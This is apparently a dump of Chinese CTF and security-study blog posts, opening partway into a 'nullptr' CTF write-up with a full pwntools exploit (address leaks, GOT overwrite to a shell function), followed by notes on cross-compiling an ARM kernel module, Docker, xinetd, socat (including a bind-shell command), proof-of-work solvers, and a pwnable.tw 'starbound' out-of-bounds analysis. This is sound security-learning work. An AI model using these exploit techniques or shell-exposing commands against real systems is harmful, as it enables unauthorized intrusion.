myproc.interactive()\n```\n\n![](nullptr10.png)\n\n上图可知，是存在got表项起始地址后三个字节为全0的情况是存在的。只不过有一定的概率。\n\n接下来就是利用case2中的任意地址写0来写_IO_buf_base中存放的堆地址了。\n\n![](nullptr11.png)\n\n`_IO_buf_base`跟`_IO_2_1_stdin`之间的偏移如上图，但是不能把整个地址写成0，所以实际写的时候得往前偏移5个字节。\n\n另外，写got表的时候，我们的目标函数时puts，在第4项。由于是从头开始覆盖，所以要先泄露出前三项，然后构造好payload进行攻击。\n\n## exp\n\n本地搭建的测试环境下获得flag如下图：\n\n![](nullptr12.png)\n\n最终的exp如下：\n\n```python\n# nullptr_exp.py\n# coding-utf-8\nfrom pwn import *\n# context(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\nwhile True:\n    myelf = ELF(\"./nullptr\")\n    mylibc = ELF(\"./libc-2.30.so\")\n    myld = ELF(\"./ld-2.30.so\")\n    myproc = remote(\"127.0.0.1\",1024)\n    \n    def view(addr):\n        myproc.recvuntil(\"[1. view, 2. null, -1. exit]> \")\n        myproc.sendline('1')\n        myproc.recvuntil(\"view address> \")\n        myproc.sendline(addr)\n        myproc.recvline()\n        ret = myproc.recvline()\n        return ret\n\n    def setnull(addr):\n        myproc.recvuntil(\"[1. view, 2. null, -1. exit]> \")\n        myproc.sendline('2')\n        myproc.recvuntil(\"nuke address> \")\n        myproc.sendline(addr)\n    \n    ###泄露栈地址\n    stack_addr = int(view('a').strip().split(\":\")[0],16)\n    #log.warn(\"stack_addr is: 0x%x\" % stack_addr)\n    \n    ###泄露_start函数地址\n    offset1 = stack_addr - (0x28 + 8*1)\n    start_addr = int(view(str(offset1)).strip().split(\":\")[1],16)\n    #log.warn(\"start_addr is: 0x%x\" % start_addr)\n\n    ###计算程序加载基址\n    elf_base = start_addr - myelf.symbols['_start']\n    shell_addr = elf_base + myelf.symbols['get_me_out_of_this_mess']\n    elf_got_base = elf_base + 0x4000\n    #log.warn(\"elf_base is: 0x%x\" % elf_base)\n    log.warn(\"elf_got_base: 0x%x\" % elf_got_base)\n    #log.warn(\"shell_addr is: 0x%x\" % shell_addr)\n\n    ###寻找满足后三个字节为全0的got表地址\n    if elf_got_base &0xfff000 == 0:\n        ###泄露libc加载基址\n        puts_got = elf_base + myelf.got[\"puts\"]\n        puts_libc = int(view(str(puts_got)).strip().split(\":\")[1],16)\n        libc_base = puts_libc - mylibc.symbols[\"puts\"]\n        #log.warn(\"puts_got is: 0x%x\" % puts_got)\n        #log.warn(\"puts_libc is: 0x%x\" % puts_libc)\n        log.warn(\"libc_base is: 0x%x\" % libc_base)\n\n        ###泄露got.plt的前3项\n        got_cont0 = int(view(str(elf_got_base)).strip().split(\":\")[1],16)\n        got_cont1 = int(view(str(elf_got_base+0x8)).strip().split(\":\")[1],16)\n        got_cont2 = int(view(str(elf_got_base+0x10)).strip().split(\":\")[1],16)\n\n        ###构造payload\n        payload = \"\"\n        payload += p64(got_cont0)\n        payload += p64(got_cont1)\n        payload += p64(got_cont2)\n        payload += p64(shell_addr)\n\n        ###计算_IO_buf_base地址，并将其存的堆地址后3个字节全写0\n        io_buf_addr = libc_base + 0x1ea980 + 0x38 - 0x5\n        setnull(str(io_buf_addr))\n        \n        myproc.recvuntil(\"[1. view, 2. null, -1. exit]> \")\n        myproc.sendline(payload)\n        \n        myproc.interactive()\n```\n\n\n\n# 参考write up\n\n[ALLES! CTF 2020 Nullptr](https://pwn-diaries.com/post/alles-ctf-2020-nullptr/)\n\n","categories":["CTF"]},{"title":"交叉编译arm linux内核模块","url":"/2022/02/20/arm-linux-ko-cross-compile/","content":"\n# 第一种方法\n\n> 需要编译整个内核\n\n参考文章：https://blukat.me/2017/12/cross-compile-arm-kernel-module/、\n\n步骤如下：\n\n1. 下载arm交叉编译器：\n\n   [linaro社区，老版本](https://releases.linaro.org/components/toolchain/binaries/) ：版本范围 4.9 ~ 7.5\n\n   [arm官网，新版本](https://developer.arm.com/tools-and-software/open-source-software/developer-tools/gnu-toolchain/gnu-a/downloads) ： 版本范围 8.2 ~10.3\n\n2. 下载对应版本的linux内核：https://mirrors.edge.kernel.org/pub/linux/kernel/\n\n3. 获取.config文件（optee场景下，编译一次后，在linux源码目录下有该文件）\n\n4. 编译linux内核\n\n   ```python\n   make ARCH=arm CROSS_COMPILE=<TOOLCHAIN_DIR>/bin/arm-linux-gnueabihf-\n   ```\n\n5. 编译内核模块\n\n# 第二种方法\n\n> 使用原有的.config文件，无需编译整个内核\n\n参考文章：https://huhaipeng.top/2019/02/01/linux内核模块的交叉编译和加载/\n\n以 [optee 3.15.0](https://github.com/OP-TEE/manifest/blob/3.15.0/default.xml) qemu版本为例，它是arm架构的，ree侧运行linux kernel。我希望在本地x86 linux上编译一个ko，且该ko能在该qemu arm linux中insmod并运行。（optee搭建可以参考我的另一篇文章 - [基于qemu的optee模拟环境搭建](https://blingblingxuanxuan.github.io/2020/12/20/qemuv8-optee/)）\n\n这涉及到交叉编译，步骤比较复杂，且暂未明白每一步骤的具体含义，因此详细记录一下我的操作过程。\n\n## 环境准备\n\n我的目标是编译一个arm版的linux内核模块，那么肯定离不开两个东西：\n\n（1）linux内核源码\n\n（2）交叉编译器\n\n下载这两个文件（注意一定要跟目标系统的版本匹配哦）：\n\n```bash\ncd /home/bling/Downloads/\n# 下载optee对应版本的linux内核源码\ngit clone -b optee-3.15.0 --depth=1 https://github.com/linaro-swg/linux.git\n# 下载交叉编译工具链\nwget https://developer.arm.com/-/media/Files/downloads/gnu-a/10.2-2020.11/binrel/gcc-arm-10.2-2020.11-x86_64-arm-none-linux-gnueabihf.tar.xz\n```\n\n重点来了，需要编译optee时linux目录下生成的.config文件，将其拷贝到当前linux目录下。然后再继续后面的步骤。\n\n在源码目录下依次执行如下3条命令：\n\n```bash\n# 根据默认.config进行设置，在menuconfig中save即可\nmake ARCH=arm CROSS_COMPILE=/home/bling/Downloads/gcc-arm-aarch32/bin/arm-none-linux-gnueabihf- menuconfig\nmake ARCH=arm CROSS_COMPILE=/home/bling/Downloads/gcc-arm-aarch32/bin/arm-none-linux-gnueabihf- prepare\nmake ARCH=arm CROSS_COMPILE=/home/bling/Downloads/gcc-arm-aarch32/bin/arm-none-linux-gnueabihf- scripts\n\n# 如果不增加make modules这一步，在编译ko时可能会找不到Module.symvers文件。参考文章：<https://www.jianshu.com/p/05450481c10e>\n# make ARCH=arm CROSS_COMPILE=/home/bling/Downloads/gcc-arm-aarch32/bin/arm-none-linux-gnueabihf- modules\n```\n\n以上，便会生成我们编译ko时所依赖的各种文件。\n\n所以接下来，我们编写ko源码及Makefile文件。\n\n## ko源码及Makefile\n\nko源码 - exp.c\n\n```bash\n#include <linux/module.h>\n#include <linux/init.h>\n#include <linux/kernel.h>\n#include <linux/arm-smccc.h>\n#include <asm/memory.h>\n\nstruct smc_calls_result {\n    unsigned long arg0;\n    unsigned long arg1;\n    unsigned long arg2;\n    unsigned long arg3;\t\n};\n\nstatic int __init init_function(void)\n{\n    union{\n            struct arm_smccc_res smccc;\n            struct smc_calls_result result;\n    } res;\n    printk(\"hello! a test ko!\\\\n\");\n \n    unsigned long a0 = 0xB2000016;\n    unsigned long a1 = 0x0;\n\tunsigned long a2 = 0x1;\n\tunsigned long a3 = 0x2;\n    arm_smccc_smc(a0, a1, a2, a3, 0, 0, 0, 0, &res.smccc);\n    printk(\"hello! end\\\\n\");\n\n    return 0;\n}\n\nstatic void __exit exit_function(void)\n{\n    printk(\"bye bye~\\\\n\");\n}\n\nmodule_init(init_function);\nmodule_exit(exit_function);\n\nMODULE_LICENSE(\"GPL\");\nMODULE_AUTHOR(\"bling\");\nMODULE_DESCRIPTION(\"testdriver\");\n```\n\nMakefile：\n\n> KDIR指定linux源码目录\n\n```bash\nKDIR := /home/bling/Downloads/linux\nobj-m += exp.o\n\nall:\n\tmake -C $(KDIR) M=$(shell pwd) modules\nclean:\n\tmake -C $(KDIR) M=$(shell pwd) clean\n```\n\n编译命令：\n\n```bash\nmake ARCH=arm CROSS_COMPILE=/home/bling/Downloads/gcc-arm-aarch32/bin/arm-none-linux-gnueabihf-\n```\n\n最后，将生成的exp.ko传到qemu内，可执行成功！\n\n## 思考\n\n1. **换成其他交叉编译器呢？**\n\n比如linaro的：https://releases.linaro.org/components/toolchain/binaries/7.5-2019.12/arm-linux-gnueabihf/\n\n实验证明，更换编译器后也能编译成功。所以重点在于`源码版本`和`.config文件`。\n\n2. **编译内核源码目录和编译ko使用不同的交叉编译器呢？**\n\n不行。实验证明会报如下错误：\n\n```bash\n$ make ARCH=arm CROSS_COMPILE=/home/bling/Downloads/gcc-arm-aarch32/bin/arm-none-linux-gnueabihf-\nmake -C /home/bling/Downloads/linux M=/home/bling/optee_v7/kotest modules\nmake[1]: Entering directory '/home/bling/Downloads/linux'\n  CC [M]  /home/bling/optee_v7/kotest/exp.o\ncc1: error: cannot load plugin ./scripts/gcc-plugins/arm_ssp_per_task_plugin.so: ./scripts/gcc-plugins/arm_ssp_per_task_plugin.so: undefined symbol: _Z14rtx_alloc_stat8rtx_code\nscripts/Makefile.build:271: recipe for target '/home/bling/optee_v7/kotest/exp.o' failed\nmake[2]: *** [/home/bling/optee_v7/kotest/exp.o] Error 1\nMakefile:1851: recipe for target '/home/bling/optee_v7/kotest' failed\nmake[1]: *** [/home/bling/optee_v7/kotest] Error 2\nmake[1]: Leaving directory '/home/bling/Downloads/linux'\nMakefile:5: recipe for target 'all' failed\nmake: *** [all] Error 2\n```\n\n所以，必须保证编译内核源码和编译ko时使用同一个版本交叉编译器。具体原因等以后学内核的时候再深究。\n\n\n# ref\n[如何为嵌入式开发建立交叉编译环境](http://web.archive.org/web/20200809125122/https://www.ibm.com/developerworks/cn/linux/l-embcmpl/)\n\n","tags":["交叉编译"],"categories":["基础技能"]},{"title":"docker 学习笔记及其在 ctf 中的应用","url":"/2022/02/20/learn-to-use-docker/","content":"\n# docker的基本使用\n\n阮一峰老师的文章：[Docker 入门教程](http://ruanyifeng.com/blog/2018/02/docker-tutorial.html)，学习过程中大部分参考了这篇文章。\n\n## 安装docker\n\n[可以参考官网链接](https://docs.docker.com/engine/install/ubuntu/)\n\n我的安装过程如下：\n\n- 卸载旧版本：`sudo apt-get remove docker docker-engine docker.io containerd runc`\n\n- 根据本地ubuntu版本选择下载要安装docker版本的.deb包：[https://download.docker.com/linux/ubuntu/dists/](https://download.docker.com/linux/ubuntu/dists/)，转到对应版本pool/stable/目录\n\n- 安装下载的deb包：`sudo dpkg -i /path/to/package.deb`\n\n- 或者使用apt安装\n\n  ```bash\n  sudo apt-get update\n  sudo apt-get install docker-ce docker-ce-cli containerd.io\n  ```\n\n  2022/11/27更新：在ubuntu20.04下，用上面的命令安装不成功，解决方案参考[Installing Docker in Ubuntu, from repo. Can't find a repo](https://stackoverflow.com/a/71395476)，命令如下：\n\n  ```bash\n  sudo apt update\n  sudo apt install docker-ce docker-ce-cli containerd.io\n  sudo apt-get install ca-certificates curl gnupg lsb-release\n  curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg\n  echo \"deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable\" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null\n  sudo apt-get update\n  sudo apt-get install docker-ce docker-ce-cli containerd.io\n  ```\n\n  \n\n- 测试安装是否成功：`sudo docker run hello-world`\n\n正常情况下运行docker是需要sudo权限的，为了防止每次都需要加一个sudo前缀，可以新建一个docker组，并将当前用户添加到这个组里。具体操作如下几条命令：\n\n```bash\nsudo groupadd docker\nsudo usermod -aG docker $USER\n```\n\n重启后，直接运行`docker run hello-world`，发现普通用户也能运行啦！\n\n## 常用命令\n\n使用docker时，常用命令都列在这儿了\n\n```bash\ndocker image ls   #列出本机所有的image文件\ndocker image rm [imageName]     #删除image文件\ndocker image pull library/hello-world       #从远程仓库将library组下的hello-world这个image文件抓取到本地 （Docker官方提供的image文件都在library中）\n\ndocker container run hello-world        #从image文件中，选取名为hello-world的image，生成一个运行的容器实例\n\ndocker container run -it ubuntu    #启动ubuntu容器时，起一个交互式shell\ndocker container run -it ubuntu bash        #达到跟上一条命令同样的效果\ndocker container run -it ubuntu ls      #启动一个ubuntu容器，并执行ls命令，执行完指定命令后，容器自动退出\ndocker container kill [containerID]     #对于不会自动终止的容器，需要使用kill手动终止\n\ndocker container ls         #列出本机正在运行的容器\ndocker container ls --all       #列出本机所有容器，包括终止运行的容器\ndocker container rm [containerID]       #对于终止运行的容器，防止其占用磁盘空间，可以使用该命令手动删除\n\ndocker container run --rm -it ubuntu /bin/bash      #使用--rm参数，在容器终止运行后，会自动删除容器文件\n\ndocker container start [containerID]        # 上面的docker container run命令每运行一次就会新建一个容器，因此可以通过start来启动已生成的容器\ndocker container stop [containerID]\ndocker container logs [containerID]\ndocker container exec -it [containerID] /bin/bash\ndocker container cp [containerID]:[/path/to/file] .\n\n```\n\necho \"123\" > test.txt\ncat > test1.txt <<EOF\n\n> 1\n> 2\n> 3\n> 4\n> EOF\n\n## 实践：制作一个容器并发布\n\n步骤：\n\n1. 编写 Dockerfile 文件\n\n2. 创建 image 文件\n\n   ```bash\n   docker image build -t koa-demo .\n   # 或者\n   docker image build -t koa-demo:0.0.1 .        \n   # 使用-t参数指定生成的image文件名，冒号后面指定标签（默认标签是latest）。最后的.指定文件所在路径，.表示当前路径\n   ```\n\n3. 生成容器\n\n   ```bash\n   docker container run --rm -p 8000:3000 -it koa-demo:0.0.1         \n   # 容器的 3000 端口映射到本机的 8000 端口\n   ```\n\n4. 发布 image 文件\n\n## 实践：使用docker-compose启动容器\n\n[Docker：Docker Compose 详解](https://www.jianshu.com/p/658911a8cff3)\n\n```c\nsudo curl -L https://github.com/docker/compose/releases/download/1.21.2/docker-compose-$(uname -s)-$(uname -m) -o /usr/local/bin/docker-compose\nsudo chmod +x /usr/local/bin/docker-compose\n```\n\ndocker-compose.yml文件解析\n\n```bash\nversion: '2' # 表示该 Docker-Compose 文件使用的是 Version 2 file\nservices:\n  docker-demo:  # 指定服务名称\n    build: .  # 指定 Dockerfile 所在路径\n    ports:    # 指定端口映射,暴露端口信息  - \"宿主机端口:容器暴露端口\"\n      - \"9000:8761\"\n```\n\n使用docker-compose.yml启动容器\n\n```bash\ndocker-compose up\ndocker-compose up -d  # 后台启动并运行容器\n# 在 docker-compose.yml 所在路径下执行该命令 Compose 就会自动构建镜像并使用镜像启动容器\n```\n\n## 实践：docker容器迁移\n\n`docker save/load` ：用来保存/加载image镜像包\n\n`docker export/import` ：用来保存/加载container容器包\n\n```bash\ndocker image ls\n\ndocker save [ImageId] > xxx.tar\ndocker load < xxx.tar\ndocker tag [ImageId] xxx:1.1.x      #有时候需要给镜像重命名并打tag\ndocker run -d --rm -h [HostName] --name [ContainerName] -p [HostPort:ContainerPort] xxx:1.1.x\n\ndocker container ls -all\ndocker export [ContainerId] > xxx.tar\ndocker import xxx.tar [ContainerName]:[Tag]      #设置导入后的镜像名称和tag\n```\n\n# ctf中的应用\n\n## **起docker**\n\n> 通常ctf比赛中提供Dockerfile给我们，我们需要先build出image，然后再运行container\n\n```\ndocker build -t nullptr . && docker run -p 1024:1024 --rm -it nullptr\n```\n\n方式2、带命令行\n\n```\ndocker build -t nullptr . && docker run -p 1024:1024 --rm -it nullptr bash\n```\n\n方式3、新开一个端口，以特权模式运行，并且带命令行\n\n```\ndocker build -t nullptr . && docker run -p 1024:1024 -p 1234:1234 --privileged --rm -it nullptr bash\n```\n\n**解决网络的问题**\n\nubuntu 19.10的source.list（注意是http，不是https）：\n\n```bash\n# 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释\ndeb [trusted=yes] http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ eoan main restricted universe multiverse\n# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ eoan main restricted universe multiverse\ndeb [trusted=yes] http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ eoan-updates main restricted universe multiverse\n# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ eoan-updates main restricted universe multiverse\ndeb [trusted=yes] http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ eoan-backports main restricted universe multiverse\n# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ eoan-backports main restricted universe multiverse\ndeb [trusted=yes] http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ eoan-security main restricted universe multiverse\n# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ eoan-security main restricted universe multiverse\n\n# 预发布软件源，不建议启用\n# deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ eoan-proposed main restricted universe multiverse\n# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ eoan-proposed main restricted universe multiverse\n```\n\n以ALLES!CTF 2020中的nullptr这个题为例，其Dockerfile做了如下修改：\n\n```dockerfile\n# docker build -t nullptr . && docker run -p 1024:1024 --rm -it nullptr\n\nFROM ubuntu:19.10\n#bling-我新增了下面这行，指定源，这样下载docker或者apt更新的时候会更快\nADD sources.list /etc/apt/\n\nRUN apt-get update && apt-get install -y gdb\nRUN useradd -d /home/ctf/ -m -p ctf -s /bin/bash ctf\nRUN echo \"ctf:ctf\" | chpasswd\n\nWORKDIR /home/ctf\n\nCOPY nullptr .\nCOPY flag .\nCOPY ynetd .\n\nRUN chmod +x ./ynetd ./nullptr\n#bling-我注释了下面这行，使docker起来后有root权限\n#USER ctf\n\nCMD ./ynetd ./nullptr\n```\n\n[Dockerfile中更换国内源](https://blog.csdn.net/yyj108317/article/details/105984674)\n\n## gdbserver调试\n\n有两种方法：\n\n1. 通过Dockerfile生成image，然后启动container时直接拉起目标进程（默认）\n\n   `docker container run --rm -p 8000:8888 -p 1234:1234 -d <img-name>:latest`\n\n   - 进入docker内部，并起一个shell：`docker exec -it <containerID> /bin/bash`\n\n   - （本地）让目标进程停下来：通过python脚本连接docker服务，并在脚本中通过raw_input()停下来，给gdbserver一些时间attach\n\n   - （docker内）查看目标进程的pid，启动gdbserver，attach到目标进程：\n\n     ```\n     gdbserver :1234 --attach <pid>\n     ```\n\n   - （本地）启动gdb，连接远程目标：\n\n     ```\n     file <xxx>\n     target remote :1234\n     ```\n\n2. 启动container时命令行指定\"/bin/bash\"，进入docker后再手动起目标进程\n\n   `docker container run --rm -p 8000:8888 -p 1234:1234 -it <img-name>:latest /bin/bash`\n\n   - （docker内部）运行目标进程：`./xxx &`\n\n   - （本地）让目标进程停下来：通过python脚本连接docker服务，并在脚本中通过raw_input()停下来，给gdbserver一些时间attach\n\n   - （docker内部）查看目标进程的pid，启动gdbserver，attach到目标进程：\n\n     ```\n     gdbserver :1234 --attach <pid>\n     ```\n\n   - （本地）启动gdb，连接远程目标：\n\n     ```\n     file <xxx>\n     target remote :1234\n     ```\n\n## 拉取docker中文件\n\n查看docker的 container id：\n\n```bash\ndocker container list\n```\n\n将docker内文件拉取至本地：\n\n```bash\ndocker cp <containerId>:/file/path/within/container /host/path/target\n```\n\n在poc脚本中指定如下libc和ld：\n\n```bash\nmyelf  = ELF(\"./note\")\nlibc   = ELF(\"./libc.so.6\")\nld     = ELF(\"./ld-2.29.so\")\nio     = process(argv=[ld.path,myelf.path],env={\"LD_PRELOAD\" : libc.path})\n```\n\n\n\n# ctf pwn题部署工具\n\n## socat\n\n> socat可以为每一个连接者提供一个独立的二进制程序执行环境\n\n[新版瑞士军刀：socat](https://zhuanlan.zhihu.com/p/347722248)\n\nsocat基本用法：\n\n```bash\nsocat - -              # 把标准输入和标准输出对接，输入什么显示什么\n\n## 网络测试\nsocat - TCP-LISTEN:8080               # 终端1 上启动 server 监听 TCP\nsocat - TCP:localhost:8080            # 终端2 上启动 client 链接 TCP\n\nsocat - TCP-LISTEN:8080,fork,reuseaddr      # 终端1 上启动 server\nsocat - TCP:localhost:8080                  # 终端2 上启动 client\n\nsocat - UDP-LISTEN:8080               # 终端1 上启动 server 监听 UDP\nsocat - UDP:localhost:8080            # 终端2 上启动 client 链接 UDP\n\n## 端口转发\nsocat TCP-LISTEN:8080,fork,reuseaddr  TCP:192.168.1.3:80       # 将8080端口所有流量转发给远程机器的 80 端口\n\n## 远程登录\nsocat TCP-LISTEN:8080,fork,reuseaddr  EXEC:/usr/bin/bash    # 服务端提供 shell\nsocat - TCP:localhost:8080                                  # 客户端登录\n\n## 网页服务\nsocat TCP-LISTEN:8080,fork,reuseaddr SYSTEM:\"bash web.sh\"\n\n## 文件传输\nsocat -u TCP-LISTEN:8080 open:record.log,create    # 服务端接收文件\nsocat -u open:record.log TCP:localhost:8080        # 客户端发送文件\n\n## 透明代理\nsocat TCP-LISTEN:<本地端口>,reuseaddr,fork SOCKS:<代理服务器IP>:<远程地址>:<远程端口>,socksport=<代理服务器端口>\nsocat TCP-LISTEN:<本地端口>,reuseaddr,fork PROXY:<代理服务器IP>:<远程地址>:<远程端口>,proxyport=<代理服务器端口>\n```\n\n\n\n## xinetd\n\n> 在实体机上部署部分题目时（如一人起一个qemu），需要使用xinetd服务\n\n### 基本使用方法：启动一个二进制\n\n那么，对于一个新手来说，应该怎样入门xinetd的使用呢？这里我记录了几个重要的步骤：\n\n1. 首先，应当写好我们要运行的二进制程序。根据外来的连接请求，我们需要为它们分别起一个新的程序，用于交互。这里以一个简单的打印程序为例。\n\n   ```c\n   // gcc aaa.c -o aaa\n   #include<stdio.h>\n   int main(int argc, char *argv[]){\n   \tprintf(\"hello 1, %s\\n\",argv[0]);\n   \tfflush(stdout);\n   \tgetchar();\n   \tprintf(\"hello 2, %s\\n\",argv[1]);\n   \tfflush(stdout);\n   \tgetchar();\n   \tprintf(\"hello 3, %s\\n\",argv[2]);\n   \tfflush(stdout);\n   \tgetchar();\n   \treturn 0;\n   }\n   ```\n\n2. 安装xinetd：`sudo apt install xinetd`\n\n3. xinetd的配置文件位于`/etc/xinetd.d/`目录下，我们需要在该目录下新建一个文件，名字随意\n\n   ```bash\n   # /etc/xinetd.d/test\n   service ctf\n   {\n       disable     = no\n       type        = UNLISTED\n       protocol    = tcp\n       socket_type = stream\n       port        = 9999\n       wait        = no\n   \n       server      = /home/bling/aaa\n       server_args = bbb ccc\n   \n       user        = root\n   }\n   ```\n\n4. 配置文件确定无误后，可以重启一下xinetd服务，让配置生效：`/etc/init.d/xinetd restart`\n\n5. 配置文件中指定了监听端口为9999，所以我们尝试一下连接该端口，得到了跟预期一样的输出。可以多开几个窗口连接试试，看看`netstat -pantu`的结果。\n\n   ```bash\n   $ nc 127.0.0.1 9999\n   hello 1, aaa\n   \n   hello 2, bbb\n   \n   hello 3, ccc\n   ```\n\n以上就是对xnetd的简单使用过程，有了基础框架的了解，后续基于此再添加功能也会清晰很多。\n\n\n\n### 使用xinetd启动多个qemu\n\n对于需要启动qemu的情况，由于qemu启动参数较多，可以使用如下方法：\n\n1. 新建一个bash脚本文件，将工作目录切换到qemu运行所需文件的目录，然后执行qemu命令（可设置timeout 120，将每个qemu的运行时间限制在120s内，防止长时间过多占用计算机资源）\n\n   ```bash\n   # start.sh\n   cd /home/bling/optee_v7/out/bin;\n   \n   timeout 120 /home/bling/optee_v7/qemu-system-arm  -nographic -smp 2 -machine virt,secure=on -cpu cortex-a15 -d unimp -semihosting-config enable=on,target=native -m 1057 -bios bl1.bin -object rng-random,filename=/dev/urandom,id=rng0 -device virtio-rng-pci,rng=rng0,max-bytes=1024,period=1000 -netdev user,id=vmnic -device virtio-net-device,netdev=vmnic\n   ```\n\n2. 将xinetd的配置文件的server和server_args改为如下设置，这样xinetd服务restart后，每当有新连接到9999端口时，就会使用sh程序执行start.sh，即启动一个qemu\n\n   ```bash\n   service ctf\n   {\n       disable     = yes\n       type        = UNLISTED\n       protocol    = tcp\n       socket_type = stream\n       port        = 9999\n       wait        = no\n           \n       server      = /bin/sh\n       server_args = /home/bling/start.sh\n   \n       user        = root\n   }\n   ```\n\nps. ctf中对于需要启动qemu的场景，通常需要选手先过一个pow，目的是平衡服务端的性能。那么需要在上文xinetd的配置文件中调用`/usr/bin/python3 /xx/xx/xx/pow.py`，通过pow.py脚本再去启动qemu。一个实际的例子可以参考我出的optee的题（后续上传了再贴连接）。\n\n### ctf pwn常用的ctf_xinetd框架\n\n在Docker中需要部署带chroot的xinetd服务时，考虑直接用ctf_xinetd模版\n\n[github ctf_xinetd](https://github.com/Eadom/ctf_xinetd)\n\n[Pwn部署框架，出题（ubuntu）](https://blog.csdn.net/YangZiTrick/article/details/109474241)\n\n现在大部分题目，都是利用xinetd+docker-compose来快速布置docker题目环境\n\n- docker-compose用于生成docker image并启动docker容器\n- xinetd在容器中，当容器开始运行后，它根据配置拉起对应的程序，并充当socat的功能\n\n使用方法：\n\n- 将ctf_xinetd目录下载到本地，并更改\n- 增加docker-compose.yml，并配置\n- 通过 `docker-compose up -d` 就能启动容器+启动容器内的二进制程序\n\n\n\n# POW\n\n## 出题时用到的\n\n待补充...\n\n## 解题时用到的\n\n### 自研多进程暴破版\n\n使用multiprocessing中的pool，参考[廖雪峰老师的博客](https://www.liaoxuefeng.com/wiki/897692888725344/923056295693632)\n\n一个ctf题的例子：`python3 this.py tkhYS 26`\n\n以后碰到需要多进程跑的题目，改改参数处理，is_valid，calc_start函数就行\n\n```python\n# this.py\nfrom multiprocessing import Pool\nimport os\nimport sys\nimport time\nimport hashlib\n\nprefix = sys.argv[1]\ndifficulty = int(sys.argv[2])\nzeros = '0' * difficulty\n\ndef is_valid(digest):\n    if sys.version_info.major == 2:\n        digest = [ord(i) for i in digest]\n    bits = ''.join(bin(i)[2:].zfill(8) for i in digest)\n    return bits[:difficulty] == zeros\n\ndef calc_start(count,end):\n    time1 = time.time()\n    while True:\n        if count >= end:\n            print(\"exceed,count is %d\" % count)\n            break\n        s = prefix + str(count)\n        if is_valid(hashlib.sha256(s.encode()).digest()):\n            time2 = time.time()\n            time3 = time2 - time1\n            print(count)\n            print(time3)\n            break\n        count +=1\n\npool = Pool()\n\n# pool.apply_async(calc_start, [0,100000,])\npool.apply_async(calc_start, [0,2500000,])\npool.apply_async(calc_start,[2500000,5000000])\npool.apply_async(calc_start,[5000000,7500000])\npool.apply_async(calc_start,[7500000,10000000])\npool.apply_async(calc_start,[10000000,12500000])\npool.apply_async(calc_start,[12500000,15000000])\npool.apply_async(calc_start,[15000000,17500000])\npool.apply_async(calc_start,[17500000,20000000])\npool.apply_async(calc_start,[20000000,22500000])\npool.apply_async(calc_start,[22500000,25000000])\npool.apply_async(calc_start,[25000000,27500000])\npool.apply_async(calc_start,[27500000,30000000])\npool.apply_async(calc_start,[30000000,32500000])\npool.apply_async(calc_start,[32500000,35000000])\npool.apply_async(calc_start,[35000000,37500000])\npool.apply_async(calc_start,[37500000,40000000])\npool.apply_async(calc_start,[40000000,42500000])\n\nprint(\"---start----\")\npool.close() \npool.join() \nprint(\"---end----\")\n```\n\n\n\n### 比赛时长亭给的版本\n\n```python\n# python3 proof_of_work.py xxxx 26\nimport string\nimport sys\nfrom hashlib import sha256\nfrom itertools import chain, product\nfrom multiprocessing import Pool\n\nsalt = None\nhard_bit = 0\n\ndef challenge(c):\n    s = sha256(salt + ''.join(c).encode()).hexdigest()\n    h = int(s, 16)\n    if h >> (256 - hard_bit) == 0:\n        return ''.join(c)\n    return None\n\ndef solve():\n    all_case = chain.from_iterable(map(lambda x: product(string.ascii_letters, repeat=x), range(10)))\n    with Pool() as p:\n        m = p.imap(challenge, all_case, 1000)\n        return next(filter(lambda x: x != None, m))\n\nif __name__ == \"__main__\":\n    if len(sys.argv) != 3:\n        print(f\"{sys.argv[0]} salt hard_bit\")\n        exit(0)\n    salt = sys.argv[1].encode()\n    hard_bit = int(sys.argv[2])\n    print(f\"result: {solve()}\")\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["docker"],"categories":["基础技能"]},{"title":"pwnable.tw 之 starbound","url":"/2021/10/02/starbound/","content":"\n\n\n题目二进制文件：[starbound](https://pwnable.tw/static/chall/starbound)\n\n# 漏洞分析\n\n以下是starbound的main函数，v3是用户输入的值，被用作数组index而未提前做检查，因此存在数组越界漏洞。\n\n```c\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  int v3; // eax\n  char nptr[256]; // [esp+10h] [ebp-104h] BYREF\n\n  init();\n  while ( 1 )\n  {\n    dword_805817C(60);\n    if ( !readn(nptr, 0x100u) )\n      break;\n    v3 = strtol(nptr, 0u, 10);\n    if ( !v3 )\n      break;\n    ((void (*)(void))dword_8058154[v3])();\n  }\n  do_bye();\n  return 0;\n}\n```\n\ndword_8058154是bss段的地址，这附近存放了许多函数指针。\n\n```c\nint show_main_menu()\n{\n  int result; // eax\n\n  puts(\"\\n-+STARBOUND v1.0+-\");\n  puts(\"  0. Exit\");\n  puts(\"  1. Info\");\n  puts(\"  2. Move\");\n  puts(\"  3. View\");\n  puts(\"  4. Tools\");\n  puts(\"  5. Kill\");\n  puts(\"  6. Settings\");\n  puts(\"  7. Multiplayer\");\n  __printf_chk(1, \"> \");\n  for ( result = 0; result <= 9; ++result )\n    dword_8058154[result] = (int)cmd_nop;\n  dword_8058158 = (int)cmd_info;\n  dword_805815C = (int)cmd_move;\n  dword_8058160 = (int)cmd_view;\n  dword_8058164 = (int)cmd_build;\n  dword_8058168 = (int)cmd_kill;\n  dword_805816C = (int)cmd_settings;\n  dword_8058170 = (int)cmd_multiplayer;\n  return result;\n}\n```\n\n考虑通过数组越界访问到一些恶意构造的函数指针，这样我们就能劫持控制流。\n\n继续分析程序分支，show_main_menu() —> cmd_settings() —> show_settings_menu() —> 